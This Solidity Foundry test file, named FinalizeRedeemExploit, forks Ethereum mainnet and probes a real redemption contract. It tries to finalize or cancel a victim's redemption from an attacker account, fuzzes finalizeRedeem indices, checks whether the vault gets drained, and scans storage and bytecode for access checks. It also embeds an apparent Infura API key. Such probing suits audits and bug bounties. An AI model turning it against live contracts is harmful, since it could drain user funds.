// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IRedemption {
    function redeem(uint96 amount) external;
    function finalizeRedeem(uint256 index) external;
    function cancelRedeem(uint256 index) external;
    function waitingPeriod() external view returns (uint32);
}

contract FinalizeRedeemExploit is Test {
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;
    address victim;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 100 ether);
    }

    function test_CanAttackerFinalizeVictimsRedemption() public {
        console.log("=== CAN ATTACKER FINALIZE VICTIM'S REDEMPTION? ===\n");

        // 1. Victim starts a redemption
        deal(IAU, victim, 1000e18);

        vm.startPrank(victim);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        console.log("1. Victim starting redemption for 100 IAU...");
        (bool success, bytes memory data) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("   Success:", success);
        if (!success && data.length >= 4) {
            console.log("   Error:");
            console.logBytes4(bytes4(data));
        }
        vm.stopPrank();

        // 2. Warp past waiting period
        vm.warp(block.timestamp + 7 days + 1);
        console.log("\n2. Warped 7 days...");

        // 3. Attacker tries to finalize victim's redemption
        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        uint256 victimBefore = IERC20(wstETH).balanceOf(victim);
        uint256 attackerBefore = IERC20(wstETH).balanceOf(attacker);

        console.log("\n3. Attacker trying to finalize victim's redemption...");
        vm.startPrank(attacker);
        (success, data) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("   Success:", success);
        if (!success && data.length >= 4) {
            console.log("   Error:");
            console.logBytes4(bytes4(data));
        }
        vm.stopPrank();

        // Check balances
        console.log("\n4. Balance check:");
        console.log("   Vault wstETH:", IERC20(wstETH).balanceOf(VAULT) / 1e18);
        console.log("   Victim wstETH gained:", (IERC20(wstETH).balanceOf(victim) - victimBefore) / 1e18);
        console.log("   Attacker wstETH gained:", (IERC20(wstETH).balanceOf(attacker) - attackerBefore) / 1e18);
    }

    function test_FindExistingRedemptionRequests() public view {
        console.log("=== FINDING EXISTING REDEMPTION REQUESTS ===\n");

        // Look for redemption requests in storage
        // The data should be in a mapping or array

        // From slot 4 analysis, epoch=5 and some state vars
        // Let's try to find user redemption data

        // Try mapping(address => RedemptionRequest[])
        // Array slot = keccak256(key . slot)

        address[] memory potentialUsers = new address[](5);
        potentialUsers[0] = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e; // Owner
        potentialUsers[1] = attacker;
        potentialUsers[2] = victim;
        potentialUsers[3] = VAULT;
        potentialUsers[4] = address(0);

        for (uint u = 0; u < potentialUsers.length; u++) {
            // Try different base slots for mappings
            for (uint base = 5; base < 15; base++) {
                bytes32 mapKey = keccak256(abi.encode(potentialUsers[u], base));
                bytes32 value = vm.load(REDEMPTION_0, mapKey);
                
                if (value != bytes32(0)) {
                    console.log("Found at base slot", base, "for user:");
                    console.log("  ", potentialUsers[u]);
                    console.logBytes32(value);
                }
            }
        }
    }

    function test_CheckPendingRedemptions() public view {
        console.log("=== CHECKING PENDING REDEMPTIONS ===\n");

        // Try to call view functions that might show pending redemptions
        bytes4[] memory selectors = new bytes4[](10);
        selectors[0] = bytes4(keccak256("pendingRedemptions()"));
        selectors[1] = bytes4(keccak256("totalPending()"));
        selectors[2] = bytes4(keccak256("getPendingRedemptions()"));
        selectors[3] = bytes4(keccak256("redemptionCount()"));
        selectors[4] = bytes4(keccak256("getRedemptionCount()"));
        selectors[5] = bytes4(keccak256("totalRedemptionRequests()"));
        selectors[6] = bytes4(keccak256("requestCount()"));
        selectors[7] = bytes4(keccak256("queueLength()"));
        selectors[8] = bytes4(keccak256("pendingCount()"));
        selectors[9] = bytes4(keccak256("activeRedemptions()"));

        for (uint i = 0; i < selectors.length; i++) {
            (bool success, bytes memory data) = REDEMPTION_0.staticcall(
                abi.encodeWithSelector(selectors[i])
            );
            if (success && data.length == 32) {
                uint256 val = abi.decode(data, (uint256));
                if (val > 0) {
                    console.logBytes4(selectors[i]);
                    console.log("  Value:", val);
                }
            }
        }

        // Try with address param
        address owner = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;
        bytes4[] memory addrSelectors = new bytes4[](5);
        addrSelectors[0] = bytes4(keccak256("pendingRedemptions(address)"));
        addrSelectors[1] = bytes4(keccak256("userRedemptionCount(address)"));
        addrSelectors[2] = bytes4(keccak256("getRedemptionCount(address)"));
        addrSelectors[3] = bytes4(keccak256("redemptionCount(address)"));
        addrSelectors[4] = bytes4(keccak256("getUserPending(address)"));

        console.log("\nWith address param (owner):");
        for (uint i = 0; i < addrSelectors.length; i++) {
            (bool success, bytes memory data) = REDEMPTION_0.staticcall(
                abi.encodeWithSelector(addrSelectors[i], owner)
            );
            if (success && data.length == 32) {
                uint256 val = abi.decode(data, (uint256));
                console.logBytes4(addrSelectors[i]);
                console.log("  Value:", val);
            }
        }
    }

    function test_AnalyzeRedemptionBytecodeForAccessControl() public view {
        console.log("=== ANALYZING FINALIZE ACCESS CONTROL ===\n");

        bytes memory code = REDEMPTION_0.code;

        // Look for finalizeRedeem (0xaff6cbf1) implementation
        // Find CALLER opcode (0x33) near it to see access checks

        bytes4 finalizeSel = bytes4(keccak256("finalizeRedeem(uint256)"));
        console.log("finalizeRedeem selector:");
        console.logBytes4(finalizeSel);

        // Count CALLER opcodes
        uint256 callerCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0x33) callerCount++;
        }
        console.log("\nTotal CALLER opcodes:", callerCount);

        // Find selector in bytecode and check nearby code
        for (uint i = 0; i + 3 < code.length; i++) {
            bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
            if (sel == finalizeSel) {
                console.log("finalizeRedeem at offset:", i);

                // Check for CALLER within 100 bytes after
                for (uint j = i; j < i + 100 && j < code.length; j++) {
                    if (uint8(code[j]) == 0x33) {
                        console.log("  CALLER check at:", j);
                    }
                }
            }
        }
    }

    function test_TryFinalizeWithManipulatedIndex() public {
        console.log("=== TRYING FINALIZE WITH MANIPULATED INDEX ===\n");

        vm.startPrank(attacker);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // Try various index values
        uint256[] memory indices = new uint256[](10);
        indices[0] = 0;
        indices[1] = 1;
        indices[2] = type(uint256).max;
        indices[3] = type(uint256).max - 1;
        indices[4] = 100;
        indices[5] = uint256(keccak256(abi.encode(attacker)));
        indices[6] = uint256(uint160(attacker));
        indices[7] = uint256(keccak256(abi.encode(attacker, uint256(0))));
        indices[8] = 2**128 - 1;
        indices[9] = 2**64 - 1;

        for (uint i = 0; i < indices.length; i++) {
            (bool success, ) = REDEMPTION_0.call(
                abi.encodeWithSignature("finalizeRedeem(uint256)", indices[i])
            );
            if (success) {
                console.log("SUCCESS with index:");
                console.log("  ", indices[i]);
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** VAULT DRAINED! ***");
            console.log("  Before:", vaultBefore / 1e18);
            console.log("  After:", vaultAfter / 1e18);
        }
    }

    function test_CheckCancelRedeem() public {
        console.log("=== CHECKING CANCEL REDEEM ===\n");

        // Can we cancel someone's redemption?

        vm.startPrank(attacker);

        console.log("Trying cancelRedeem(0)...");
        (bool success, bytes memory data) = REDEMPTION_0.call(
            abi.encodeWithSignature("cancelRedeem(uint256)", 0)
        );
        console.log("Success:", success);
        if (!success && data.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(data));
        }

        // Try various indices
        console.log("\nTrying cancelRedeem with type(uint256).max...");
        (success, data) = REDEMPTION_0.call(
            abi.encodeWithSignature("cancelRedeem(uint256)", type(uint256).max)
        );
        console.log("Success:", success);

        vm.stopPrank();
    }
}
